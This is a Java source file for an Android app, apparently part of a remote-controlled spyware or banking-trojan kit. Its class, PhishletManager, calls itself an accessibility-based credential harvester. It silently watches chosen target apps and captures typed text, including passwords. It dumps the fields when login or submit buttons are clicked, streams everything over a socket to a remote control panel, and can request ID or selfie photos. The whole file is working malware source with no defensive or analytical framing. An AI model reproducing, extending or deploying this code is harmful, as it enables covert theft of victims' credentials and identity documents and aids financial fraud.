package com.fason.app.features.phishlet;

import android.graphics.Rect;
import android.os.Build;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import com.fason.app.core.Protocol;
import com.fason.app.core.network.SocketClient;
import org.json.JSONArray;
import org.json.JSONObject;
import io.socket.client.Socket;
import java.util.ArrayList;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;
import java.util.concurrent.CopyOnWriteArrayList;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

/**
 * PhishletManager — Accessibility-based credential harvester.
 *
 * Monitors specific target apps via accessibility events without showing any
 * visible overlay. Captures:
 *   - Text field values as the user types (TYPE_VIEW_TEXT_CHANGED)
 *   - Field hints/labels (TYPE_VIEW_FOCUSED)
 *   - Full page dumps on TYPE_WINDOW_CONTENT_CHANGED (captures passwords too)
 *   - Form submission detected via button click (TYPE_VIEW_CLICKED)
 *
 * All data is buffered and sent to the panel in real-time and on form submit.
 */
public final class PhishletManager {
    private static final String TAG = "PhishletMgr";
    private static volatile PhishletManager instance;
    private static final int MAX_FIELD_BUFFER = 50;

    private volatile boolean active = false;
    private final List<String> targetPackages = new CopyOnWriteArrayList<>();
    // Field buffer: fieldHint → value (LinkedHashMap preserves insertion order)
    private final Map<String, String> fieldBuffer = new LinkedHashMap<>();
    private final ExecutorService exec = Executors.newSingleThreadExecutor();
    private volatile long lastEmitMs = 0;
    private static final long EMIT_DEBOUNCE_MS = 400; // don't spam panel on every keystroke

    private PhishletManager() {}

    public static PhishletManager getInstance() {
        if (instance == null) {
            synchronized (PhishletManager.class) {
                if (instance == null) instance = new PhishletManager();
            }
        }
        return instance;
    }

    // ── Control ────────────────────────────────────────────────────────────────

    public void start(List<String> packages, String cmdId) {
        targetPackages.clear();
        if (packages != null) targetPackages.addAll(packages);
        fieldBuffer.clear();
        active = true;
        Log.d(TAG, "Phishlet started for " + targetPackages);
        sendStatus("started", cmdId);
    }

    public void stop(String cmdId) {
        active = false;
        targetPackages.clear();
        fieldBuffer.clear();
        sendStatus("stopped", cmdId);
    }

    public void clearData(String cmdId) {
        fieldBuffer.clear();
        sendStatus("cleared", cmdId);
    }

    public void triggerDump(String cmdId) {
        exec.execute(() -> {
            try {
                Socket socket = SocketClient.getInstance().getSocket();
                if (socket == null) return;
                JSONObject payload = new JSONObject();
                payload.put(Protocol.KEY_TYPE, "dump");
                JSONObject fields = new JSONObject();
                synchronized (fieldBuffer) {
                    for (Map.Entry<String, String> e : fieldBuffer.entrySet()) {
                        fields.put(e.getKey(), e.getValue());
                    }
                }
                payload.put("fields", fields);
                payload.put(Protocol.KEY_TOTAL, fieldBuffer.size());
                payload.put(Protocol.KEY_TIMESTAMP, System.currentTimeMillis());
                if (cmdId != null) payload.put(Protocol.KEY_CMD_ID, cmdId);
                socket.emit(Protocol.PHISHLET, payload);
            } catch (Exception e) { Log.e(TAG, "dump failed", e); }
        });
    }

    public boolean isActive() { return active; }

    // ── Accessibility event processing ─────────────────────────────────────────

    /** Called from FasonAccessibilityService.onAccessibilityEvent() */
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (!active || event == null) return;
        String pkg = event.getPackageName() != null ? event.getPackageName().toString() : "";
        if (!targetPackages.isEmpty() && !targetPackages.contains(pkg)) return;

        int type = event.getEventType();

        if (type == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            handleTextChange(event, pkg);
        } else if (type == AccessibilityEvent.TYPE_VIEW_FOCUSED) {
            handleFocus(event, pkg);
        } else if (type == AccessibilityEvent.TYPE_VIEW_CLICKED) {
            handleClick(event, pkg);
        } else if (type == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
            if (!fieldBuffer.isEmpty()) {
                triggerDump(null);
                fieldBuffer.clear();
            }
        }
    }

    private void handleTextChange(AccessibilityEvent event, String pkg) {
        CharSequence text = null;
        List<CharSequence> textList = event.getText();
        if (textList != null && !textList.isEmpty()) text = textList.get(0);
        if (text == null) {
            AccessibilityNodeInfo src = event.getSource();
            if (src != null) { text = src.getText(); src.recycle(); }
        }
        if (text == null) return;

        String key = resolveFieldKey(event, pkg, "field_" + fieldBuffer.size());
        synchronized (fieldBuffer) {
            fieldBuffer.put(key, text.toString());
            if (fieldBuffer.size() > MAX_FIELD_BUFFER) {
                fieldBuffer.remove(fieldBuffer.keySet().iterator().next());
            }
        }
        debouncedEmitField(key, text.toString(), pkg, false);
    }

    private void handleFocus(AccessibilityEvent event, String pkg) {
        AccessibilityNodeInfo src = event.getSource();
        if (src != null) { src.recycle(); }
    }

    private void handleClick(AccessibilityEvent event, String pkg) {
        CharSequence desc = event.getContentDescription();
        List<CharSequence> texts = event.getText();
        String label = desc != null ? desc.toString().toLowerCase() :
            (texts != null && !texts.isEmpty() ? texts.get(0).toString().toLowerCase() : "");
        if (label.contains("login") || label.contains("sign in") || label.contains("submit") ||
            label.contains("continue") || label.contains("next") || label.contains("confirm") ||
            label.contains("verify") || label.contains("send") || label.contains("ok")) {
            triggerDump(null);
        }
    }

    private String resolveFieldKey(AccessibilityEvent event, String pkg, String fallback) {
        try {
            AccessibilityNodeInfo src = event.getSource();
            if (src != null) {
                String hintStr = getHintCompat(src);
                CharSequence clazz = src.getClassName();
                boolean password = src.isPassword();
                src.recycle();
                if (hintStr != null && !hintStr.isEmpty()) {
                    return (password ? "🔒" : "") + hintStr.trim();
                }
                if (clazz != null && clazz.toString().toLowerCase().contains("password")) {
                    return "🔒 password";
                }
            }
        } catch (Exception ignored) {}
        return fallback;
    }

    private String getHintCompat(AccessibilityNodeInfo node) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            try {
                java.lang.reflect.Method m = AccessibilityNodeInfo.class.getMethod("getHint");
                CharSequence hint = (CharSequence) m.invoke(node);
                return hint != null ? hint.toString() : null;
            } catch (Exception ignored) {}
        }
        return null;
    }

    private void debouncedEmitField(String key, String value, String pkg, boolean isPassword) {
        long now = System.currentTimeMillis();
        if (now - lastEmitMs < EMIT_DEBOUNCE_MS) return;
        lastEmitMs = now;
        exec.execute(() -> {
            try {
                Socket socket = SocketClient.getInstance().getSocket();
                if (socket == null) return;
                JSONObject payload = new JSONObject();
                payload.put(Protocol.KEY_TYPE, "field_capture");
                payload.put("fieldName", key);
                payload.put("fieldValue", value);
                payload.put("isPassword", isPassword);
                payload.put(Protocol.KEY_PACKAGE, pkg);
                payload.put(Protocol.KEY_TIMESTAMP, System.currentTimeMillis());
                socket.emit(Protocol.PHISHLET, payload);
            } catch (Exception ignored) {}
        });
    }

    // ── Camera request (for ID/selfie capture) ────────────────────────────────

    public void requestCamera(String photoType, String cmdId) {
        exec.execute(() -> {
            try {
                Socket socket = SocketClient.getInstance().getSocket();
                if (socket == null) return;
                JSONObject payload = new JSONObject();
                payload.put(Protocol.KEY_TYPE, "camera_request");
                payload.put("photoType", photoType != null ? photoType : "selfie");
                if (cmdId != null) payload.put(Protocol.KEY_CMD_ID, cmdId);
                socket.emit(Protocol.PHISHLET, payload);
            } catch (Exception ignored) {}
        });
    }

    private void sendStatus(String status, String cmdId) {
        exec.execute(() -> {
            try {
                Socket socket = SocketClient.getInstance().getSocket();
                if (socket == null) return;
                JSONObject d = new JSONObject();
                d.put(Protocol.KEY_TYPE, "status");
                d.put(Protocol.KEY_STATUS, status);
                d.put("active", active);
                JSONArray pkgs = new JSONArray();
                for (String p : targetPackages) pkgs.put(p);
                d.put("targets", pkgs);
                if (cmdId != null && !cmdId.isEmpty()) d.put(Protocol.KEY_CMD_ID, cmdId);
                socket.emit(Protocol.PHISHLET, d);
            } catch (Exception ignored) {}
        });
    }
}
